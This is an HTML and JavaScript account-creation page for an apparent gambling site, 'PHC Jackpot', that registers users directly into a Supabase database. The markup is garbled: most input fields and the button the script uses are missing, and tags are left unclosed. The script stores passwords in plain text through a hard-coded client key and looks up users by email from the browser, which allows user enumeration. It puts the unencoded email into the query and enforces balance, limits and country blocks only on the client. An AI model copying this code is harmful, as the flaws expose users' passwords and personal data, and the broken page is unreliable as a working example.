<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
  <title>PHC Jackpot – Create Account</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,400;14..32,500;14..32,600;14..32,700;14..32,800;14..32,900&display=swap" rel="stylesheet" />
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: 'Inter', sans-serif;
    }

    body {
      background: #eef2f7;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 20px;
    }

    body.dark {
      background: #0f172a;
    }

    .auth-container {
      max-width: 520px;
      width: 100%;
      background: #ffffff;
      border-radius: 32px;
      padding: 48px 40px 40px;
      box-shadow: 0 20px 60px rgba(0, 0, 0, 0.08);
      border: 1px solid rgba(0, 0, 0, 0.03);
    }

    body.dark .auth-container {
      background: #1e293b;
      border-color: #334155;
      box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
    }

    /* ============================================================ */
    /* LOGO */
    /* ============================================================ */
    .auth-logo {
      text-align: center;
      margin-bottom: 36px;
    }

    .auth-logo .logo-icon {
      background: linear-gradient(135deg, #1a237e, #283593);
      width: 80px;
      height: 80px;
      border-radius: 24px;
      display: inline-flex;
      align-items: center;
      justify-content: center;
      color: #f5b342;
      font-size: 34px;
      font-weight: 900;
      box-shadow: 0 8px 30px rgba(26, 35, 126, 0.2);
      margin-bottom: 14px;
    }

    body.dark .auth-logo .logo-icon {
      box-shadow: 0 8px 30px rgba(0, 0, 0, 0.3);
    }

    .auth-logo h1 {
      font-size: 28px;
      font-weight: 800;
      color: #0a1a2a;
      letter-spacing: -0.5px;
    }

    body.dark .auth-logo h1 {
      color: #f8fafc;
    }

    .auth-logo h1 small {
      display: block;
      font-size: 14px;
      font-weight: 500;
      color: #6c7a8a;
      letter-spacing: 1px;
      margin-top: 4px;
    }

    body.dark .auth-logo h1 small {
      color: #94a3b8;
    }

    .auth-logo .tagline {
      font-size: 15px;
      color: #6c7a8a;
      margin-top: 6px;
      letter-spacing: 0.5px;
    }

    body.dark .auth-logo .tagline {
      color: #94a3b8;
    }

    /* ============================================================ */
    /* FORM */
    /* ============================================================ */
    .auth-form {
      display: flex;
      flex-direction: column;
      gap: 18px;
    }

    .auth-form .form-group {
      display: flex;
      flex-direction: column;
      gap: 5px;
    }

    .auth-form label {
      font-size: 14px;
      font-weight: 600;
      color: #1a3a5a;
    }

    body.dark .auth-form label {
      color: #e2e8f0;
    }

    .auth-form .input-wrapper {
      position: relative;
      display: flex;
      align-items: center;
      background: #f5f8fc;
      border-radius: 16px;
      border: 2px solid #e6edf6;
      transition: 0.2s;
    }

    body.dark .auth-form .input-wrapper {
      background: #2a3a5a;
      border-color: #334155;
    }

    .auth-form .input-wrapper:focus-within {
      border-color: #1a237e;
      box-shadow: 0 0 0 4px rgba(26, 35, 126, 0.08);
    }

    body.dark .auth-form .input-wrapper:focus-within {
      border-color: #f5b342;
      box-shadow: 0 0 0 4px rgba(245, 179, 66, 0.08);
    }

    .auth-form .input-wrapper i {
      position: absolute;
      left: 18px;
      color: #7a8a9a;
      font-size: 18px;
    }

    body.dark .auth-form .input-wrapper i {
      color: #94a3b8;
    }

    .auth-form .input-wrapper input,
    .auth-form .input-wrapper select {
      width: 100%;
      padding: 18px 18px 18px 52px;
      border: none;
      background: transparent;
      font-size: 16px;
      outline: none;
      color: #0a1a2a;
    }

    body.dark .auth-form .input-wrapper input,
    body.dark .auth-form .input-wrapper select {
      color: #f8fafc;
    }

    .auth-form .input-wrapper select {
      appearance: none;
      cursor: pointer;
      padding-right: 45px;
    }

    .auth-form .input-wrapper select option {
      background: #ffffff;
      color: #0a1a2a;
      padding: 10px;
    }

    body.dark .auth-form .input-wrapper select option {
      background: #1e293b;
      color: #f8fafc;
    }

    .auth-form .input-wrapper .dropdown-arrow {
      position: absolute;
      right: 18px;
      color: #7a8a9a;
      font-size: 16px;
      pointer-events: none;
    }

    body.dark .auth-form .input-wrapper .dropdown-arrow {
      color: #94a3b8;
    }

    .auth-form .input-wrapper input::placeholder {
      color: #aabbcc;
    }

    body.dark .auth-form .input-wrapper input::placeholder {
      color: #6c7a8a;
    }

    .auth-form .input-wrapper .toggle-pass {
      position: absolute;
      right: 18px;
      color: #7a8a9a;
      cursor: pointer;
      font-size: 18px;
      z-index: 2;
    }

    body.dark .auth-form .input-wrapper .toggle-pass {
      color: #94a3b8;
    }

    .auth-form .input-wrapper .toggle-pass:hover {
      color: #1a237e;
    }

    body.dark .auth-form .input-wrapper .toggle-pass:hover {
      color: #f5b342;
    }

    /* ============================================================ */
    /* PHONE GROUP */
    /* ============================================================ */
    .phone-group {
      display: flex;
      gap: 12px;
    }

    .phone-group .input-wrapper {
      flex: 1;
    }

    .phone-group .input-wrapper:first-child {
      flex: 0 0 140px;
    }

    .phone-group .input-wrapper:first-child i {
      left: 14px;
    }

    .phone-group .input-wrapper:first-child input {
      padding-left: 44px;
      text-align: center;
      font-weight: 700;
      color: #1a237e;
      font-size: 17px;
    }

    body.dark .phone-group .input-wrapper:first-child input {
      color: #f5b342;
    }

    /* ============================================================ */
    /* ROW */
    /* ============================================================ */
    .row {
      display: grid;
      grid-template-columns: 1fr 1fr;
      gap: 16px;
    }

    /* ============================================================ */
    /* BUTTON */
    /* ============================================================ */
    .auth-btn {
      background: linear-gradient(135deg, #1a237e, #283593);
      color: #ffffff;
      border: none;
      border-radius: 30px;
      padding: 20px;
      font-size: 19px;
      font-weight: 700;
      cursor: pointer;
      transition: 0.2s;
      box-shadow: 0 6px 30px rgba(26, 35, 126, 0.2);
      margin-top: 10px;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 12px;
    }

    body.dark .auth-btn {
      background: linear-gradient(135deg, #f5b342, #f59e0b);
      color: #0f172a;
      box-shadow: 0 6px 30px rgba(245, 179, 66, 0.2);
    }

    .auth-btn:hover {
      transform: translateY(-2px);
      box-shadow: 0 8px 40px rgba(26, 35, 126, 0.3);
    }

    body.dark .auth-btn:hover {
      box-shadow: 0 8px 40px rgba(245, 179, 66, 0.3);
    }

    .auth-btn:disabled {
      opacity: 0.6;
      cursor: not-allowed;
      transform: none;
    }

    /* ============================================================ */
    /* DIVIDER */
    /* ============================================================ */
    .auth-divider {
      display: flex;
      align-items: center;
      gap: 20px;
      margin: 22px 0 16px;
      color: #7a8a9a;
      font-size: 14px;
    }

    body.dark .auth-divider {
      color: #94a3b8;
    }

    .auth-divider::before,
    .auth-divider::after {
      content: '';
      flex: 1;
      height: 1px;
      background: #e6edf6;
    }

    body.dark .auth-divider::before,
    body.dark .auth-divider::after {
      background: #334155;
    }

    /* ============================================================ */
    /* SWITCH */
    /* ============================================================ */
    .auth-switch {
      text-align: center;
      font-size: 15px;
      color: #5a7a9a;
    }

    body.dark .auth-switch {
      color: #94a3b8;
    }

    .auth-switch a {
      color: #1a237e;
      font-weight: 700;
      text-decoration: none;
      cursor: pointer;
    }

    body.dark .auth-switch a {
      color: #f5b342;
    }

    .auth-switch a:hover {
      text-decoration: underline;
    }

    /* ============================================================ */
    /* MESSAGES */
    /* ============================================================ */
    .auth-error {
      color: #b33a4a;
      font-size: 14px;
      font-weight: 600;
      display: none;
      text-align: center;
      padding: 12px 16px;
      background: #fde8e8;
      border-radius: 12px;
    }

    body.dark .auth-error {
      background: #3a1a1a;
      color: #f87171;
    }

    .auth-success {
      color: #1a8a4a;
      font-size: 14px;
      font-weight: 600;
      display: none;
      text-align: center;
      padding: 12px 16px;
      background: #e6f5ed;
      border-radius: 12px;
    }

    body.dark .auth-success {
      background: #1a3a2a;
      color: #10b981;
    }

    .success-box {
      background: #e6f5ed;
      border-radius: 16px;
      padding: 28px;
      text-align: center;
      display: none;
      border: 2px solid #1a8a4a;
      margin-top: 10px;
    }

    body.dark .success-box {
      background: #1a3a2a;
      border-color: #10b981;
    }

    .success-box .big-icon {
      font-size: 60px;
      color: #1a8a4a;
      display: block;
      margin-bottom: 12px;
    }

    body.dark .success-box .big-icon {
      color: #10b981;
    }

    .success-box h2 {
      color: #1a8a4a;
      font-size: 24px;
      font-weight: 800;
    }

    body.dark .success-box h2 {
      color: #10b981;
    }

    .success-box p {
      color: #3a6a5a;
      font-size: 15px;
      margin-top: 4px;
    }

    body.dark .success-box p {
      color: #94a3b8;
    }

    /* ============================================================ */
    /* TOAST */
    /* ============================================================ */
    .toast {
      position: fixed;
      bottom: 30px;
      left: 50%;
      transform: translateX(-50%);
      background: #0a1a2a;
      color: #ffffff;
      padding: 16px 32px;
      border-radius: 40px;
      font-weight: 600;
      font-size: 15px;
      z-index: 9999;
      box-shadow: 0 8px 30px rgba(0, 0, 0, 0.2);
      display: none;
      max-width: 90%;
      text-align: center;
    }

    body.dark .toast {
      background: #1e293b;
    }

    .toast.show {
      display: block;
      animation: toastIn 0.3s ease;
    }

    @keyframes toastIn {
      from {
        opacity: 0;
        transform: translateX(-50%) translateY(20px);
      }
      to {
        opacity: 1;
        transform: translateX(-50%) translateY(0);
      }
    }

    .spinner {
      display: inline-block;
      width: 24px;
      height: 24px;
      border: 3px solid rgba(255, 255, 255, 0.3);
      border-top-color: #ffffff;
      border-radius: 50%;
      animation: spin 0.6s linear infinite;
      vertical-align: middle;
      margin-right: 12px;
    }

    body.dark .spinner {
      border: 3px solid rgba(15, 23, 42, 0.3);
      border-top-color: #0f172a;
    }

    @keyframes spin {
      to {
        transform: rotate(360deg);
      }
    }

    /* ============================================================ */
    /* RESPONSIVE */
    /* ============================================================ */
    @media (max-width: 480px) {
      .auth-container {
        padding: 32px 24px 28px;
        border-radius: 28px;
      }

      .auth-logo .logo-icon {
        width: 64px;
        height: 64px;
        font-size: 28px;
        border-radius: 20px;
      }

      .auth-logo h1 {
        font-size: 24px;
      }

      .row {
        grid-template-columns: 1fr;
        gap: 12px;
      }

      .phone-group {
        flex-wrap: wrap;
      }

      .phone-group .input-wrapper:first-child {
        flex: 1;
        min-width: 120px;
      }

      .auth-form .input-wrapper input,
      .auth-form .input-wrapper select {
        padding: 16px 16px 16px 48px;
        font-size: 15px;
      }

      .auth-btn {
        padding: 17px;
        font-size: 17px;
      }

      .auth-form {
        gap: 14px;
      }
    }

    @media (max-width: 380px) {
      .auth-container {
        padding: 24px 16px 20px;
        border-radius: 24px;
      }

      .auth-logo .logo-icon {
        width: 56px;
        height: 56px;
        font-size: 24px;
      }

      .auth-logo h1 {
        font-size: 20px;
      }

      .auth-form .input-wrapper input,
      .auth-form .input-wrapper select {
        padding: 14px 14px 14px 44px;
        font-size: 14px;
      }

      .auth-btn {
        padding: 15px;
        font-size: 15px;
      }
    }
  </style>
</head>
<body>

  <div class="auth-container">
    <div class="auth-logo">

      <div class="form-group">

        <div class="phone-group">

          </select>

      <div class="form-group">
        <label>Address</label>
        <div class="input-wrapper">

      <div class="form-group">

        <div class="input-wrapper">
          <i class="fas fa-lock"></i>
          <input type="password" id="regConfirmPassword" placeholder="Confirm your password" />
          <span class="toggle-pass" onclick="togglePassword('regConfirmPassword', this)">

        <span class="big-icon">✅</span>

    <div class="auth-divider">or</div>

      Already have an account? <a href="login.html">Login</a>
    </div>

  <div class="toast" id="toast">Message</div>

  <script>
    // ============================================================
    // ✅ SUPABASE CONFIGURATION
    // ============================================================
    const SUPABASE_URL = "https://gcesrhfyupmkrevaqpfr.supabase.co";
    const SUPABASE_ANON_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImdjZXNyaGZ5dXBta3JldmFxcGZyIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODI4MjQ0MjAsImV4cCI6MjA5ODQwMDQyMH0.LarBYjP0Eg4HfFV_x5GVS7K1d4AuRfBWOjo0D1kL2xM";

    // ============================================================
    // HELPERS
    // ============================================================
    function showToast(msg) {
      const t = document.getElementById('toast');
      t.textContent = msg;
      t.classList.add('show');
      clearTimeout(t._timer);
      t._timer = setTimeout(() => t.classList.remove('show'), 3000);
    }

    function togglePassword(id, el) {
      const i = document.getElementById(id);
      if (i.type === 'password') {
        i.type = 'text';
        el.innerHTML = '<i class="fas fa-eye-slash"></i>';
      } else {
        i.type = 'password';
        el.innerHTML = '<i class="fas fa-eye"></i>';
      }
    }

    function updateCountryCode() {
      const select = document.getElementById('regCountry');
      const code = select.options[select.selectedIndex].dataset.code || '+1';
      document.getElementById('regCountryCode').value = code;
    }

    // ============================================================
    // DARK MODE
    // ============================================================
    (function() {
      if (localStorage.getItem("phc_dark_mode") === "true") {
        document.body.classList.add("dark");
      }
    })();

    // ============================================================
    // REGISTRATION
    // ============================================================
    document.getElementById('createBtn').addEventListener('click', async function() {
      const firstName = document.getElementById('regFirstName').value.trim();
      const lastName = document.getElementById('regLastName').value.trim();
      const email = document.getElementById('regEmail').value.trim().toLowerCase();
      const phone = document.getElementById('regPhone').value.trim();
      const address = document.getElementById('regAddress').value.trim();
      const countrySelect = document.getElementById('regCountry');
      const country = countrySelect.value;
      const countryCode = document.getElementById('regCountryCode').value;
      const password = document.getElementById('regPassword').value.trim();
      const confirm = document.getElementById('regConfirmPassword').value.trim();

      document.getElementById('regError').style.display = 'none';
      document.getElementById('successBox').style.display = 'none';

      if (!firstName || !lastName || !email || !phone || !address || !password || !confirm) {
        showToast('⚠️ Please fill in all fields.');
        return;
      }
      if (password !== confirm) {
        showToast('⚠️ Passwords do not match.');
        return;
      }
      if (password.length < 8) {
        showToast('⚠️ Password must be at least 8 characters.');
        return;
      }
      if (!email.includes('@') || !email.includes('.')) {
        showToast('⚠️ Please enter a valid email address.');
        return;
      }
      if (phone.length < 6) {
        showToast('⚠️ Please enter a valid phone number.');
        return;
      }

      const blocked = ['Nigeria'];
      if (blocked.includes(country)) {
        showToast('⚠️ Registration is not available for your country.');
        return;
      }

      const btn = document.getElementById('createBtn');
      btn.disabled = true;
      btn.innerHTML = '<span class="spinner"></span> Creating Account...';

      try {
        // Check if user exists
        const checkRes = await fetch(`${SUPABASE_URL}/rest/v1/users?email=eq.${email}`, {
          method: 'GET',
          headers: {
            'apikey': SUPABASE_ANON_KEY,
            'Authorization': `Bearer ${SUPABASE_ANON_KEY}`
          }
        });

        if (checkRes.status === 404) {
          showToast('⚠️ Database setup required. Please run SQL in Supabase.');
          document.getElementById('regError').style.display = 'block';
          document.getElementById('regError').textContent = '⚠️ Run SQL setup in Supabase first.';
          btn.disabled = false;
          btn.innerHTML = '<i class="fas fa-user-plus"></i> Create Account';
          return;
        }

        let existingUsers = [];
        try {
          const text = await checkRes.text();
          if (text && text.length > 0 && text !== '[]') {
            existingUsers = JSON.parse(text);
          }
        } catch (e) {}

        if (existingUsers && existingUsers.length > 0) {
          showToast('⚠️ This email is already registered. Please login.');
          btn.disabled = false;
          btn.innerHTML = '<i class="fas fa-user-plus"></i> Create Account';
          return;
        }

        // Build user data
        const userData = {
          email: email,
          first_name: firstName,
          last_name: lastName,
          phone: countryCode + ' ' + phone,
          password: password,
          address: address || '',
          country: country || 'United States',
          balance: 10.00,
          level: 1,
          withdrawal_limit: 1.00,
          kyc_level: 0,
          kyc_status: 'unverified',
          entries: 0,
          games: 0,
          wins: 0,
          loan_balance: 0,
          loan_status: 'No active loan'
        };

        // Insert into Supabase
        const insertRes = await fetch(`${SUPABASE_URL}/rest/v1/users`, {
          method: 'POST',
          headers: {
            'apikey': SUPABASE_ANON_KEY,
            'Authorization': `Bearer ${SUPABASE_ANON_KEY}`,
            'Content-Type': 'application/json',
            'Prefer': 'return=representation'
          },
          body: JSON.stringify(userData)
        });

        if (!insertRes.ok) {
          const errorText = await insertRes.text();
          console.error('❌ Insert Error:', errorText);

          if (insertRes.status === 401 || insertRes.status === 403) {
            showToast('⚠️ API Key error. Please check your Supabase credentials.');
            document.getElementById('regError').style.display = 'block';
            document.getElementById('regError').textContent = '⚠️ API Key error. Make sure you are using the "anon public" key.';
          } else {
            showToast('❌ Failed to create account.');
            document.getElementById('regError').style.display = 'block';
            document.getElementById('regError').textContent = '❌ Error: ' + insertRes.status + ' - ' + errorText.substring(0, 150);
          }

          btn.disabled = false;
          btn.innerHTML = '<i class="fas fa-user-plus"></i> Create Account';
          return;
        }

        const newUser = await insertRes.json();
        console.log('✅ User created:', newUser);

        localStorage.setItem('phc_current_user', JSON.stringify({
          email: email,
          firstName: firstName,
          lastName: lastName,
          phone: countryCode + ' ' + phone,
          balance: 10.00,
          address: address || '',
          country: country || 'United States',
          kyc_level: 0,
          kyc_status: 'unverified',
          level: 1,
          withdrawal_limit: 1.00,
          entries: 0,
          games: 0,
          wins: 0,
          loan_status: 'No active loan',
          loan_balance: 0
        }));

        document.getElementById('successBox').style.display = 'block';
        showToast('✅ Account created successfully!');

        setTimeout(() => {
          window.location.href = 'index.html';
        }, 2000);

      } catch (error) {
        console.error('❌ Registration Error:', error);
        showToast('❌ ' + error.message);
        document.getElementById('regError').style.display = 'block';
        document.getElementById('regError').textContent = '❌ ' + error.message;
        btn.disabled = false;
        btn.innerHTML = '<i class="fas fa-user-plus"></i> Create Account';
      }
    });
  </script>

</body>
</html>
